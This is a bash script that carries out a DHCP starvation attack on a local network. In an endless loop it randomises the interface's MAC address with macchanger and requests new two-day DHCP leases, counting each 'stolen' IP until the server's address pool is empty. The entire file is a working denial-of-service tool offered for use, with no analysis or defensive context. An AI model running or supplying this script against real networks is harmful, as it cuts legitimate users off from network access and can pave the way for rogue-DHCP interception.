#!/bin/bash

if [[ -z $1 ]]; then
	interface='eth0'
else
	interface=$1
fi

if [ ! -L "/sys/class/net/${interface}" ]
then
	echo "ERROR : Unknown network interface : ${interface}"

	echo -n "         network interfaces : "
	find /sys/class/net/ -maxdepth 1 -type l -printf '%f '
	echo

	exit 1
fi

for tool in macchanger dhclient
do
	if [ -z "$(which ${tool})" ]
	then
		echo "ERROR : The tool '${tool}' is not installed"
		exit 2
	fi
done

if (( EUID ))
then
	echo "ERROR : This program must be run with the root rights"
	exit 3
fi

if [ -n "$(which ip)" ]
then
	IPCommand=true
else
	IPCommand=false
fi

LEASETime=172800 # 2 days = 172800s

PIDFile="/tmp/dhcp-starvation.dhclient.${interface}.pid"
LEASEFile="/tmp/dhcp-starvation.dhclient.${interface}.lease"
CONFIGFile="/tmp/dhcp-starvation.dhclient.conf"

cat > "${CONFIGFile}" <<EOF
initial-interval 1;
send dhcp-lease-time ${LEASETime};
EOF

rm -f "${PIDFile}"

NumberAddress=0
NumberStolenIP=0

while true; do
	# We kill every dhclient process
	if [ -e "${PIDFile}" ]
	then
		PID=$(cat "${PIDFile}")
		kill "${PID}"
		while kill -0 "${PID}" 2>/dev/null; do
			sleep 1
		done
	fi
	rm -f "${PIDFile}" "${LEASEFile}"

	# We disable our interface
	if ${IPCommand}
	then
		ip link set "${interface}" down
		ip add flush "${interface}"
	else
		ifconfig "${interface}" down
		ifconfig "${interface}" 0.0.0.0
	fi

	echo -n "$((++NumberAddress))] "
	# We switch our MAC address for out interface
	macchanger -a "${interface}" | grep '^New MAC:'

	# We enable again our interface
	if ${IPCommand}
	then
		ip link set "${interface}" up
	else
		ifconfig "${interface}" up
	fi

	# We get a new DHCP Lease
	if ! dhclient -v "${interface}" -pf "${PIDFile}" -lf "${LEASEFile}" -cf "${CONFIGFile}" 2>&1 | grep DHCPACK
	then
		echo "dhcp pool perhaps empty (${NumberStolenIP} stolen IP) !!!!"
	else
		((NumberStolenIP++))
	fi

	sleep 1s
done
